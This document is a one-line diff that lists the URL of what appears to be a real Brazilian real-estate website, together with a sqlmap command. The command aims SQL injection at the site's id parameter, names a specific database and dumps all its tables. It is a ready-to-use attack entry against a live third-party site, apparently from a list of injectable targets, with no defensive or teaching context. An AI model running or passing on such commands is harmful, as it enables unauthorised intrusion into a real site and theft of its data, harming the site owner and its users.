@@ -1,0 +1,1 @@
+https://www.andaraimoveis.com.br/?pagina=ver&id=7233 (GET)  # sqlmap.py -u https://www.andaraimoveis.com.br/?pagina=ver&id=7233 -D andaraimoveis1 --tables --dump-all --threads 5 -v3
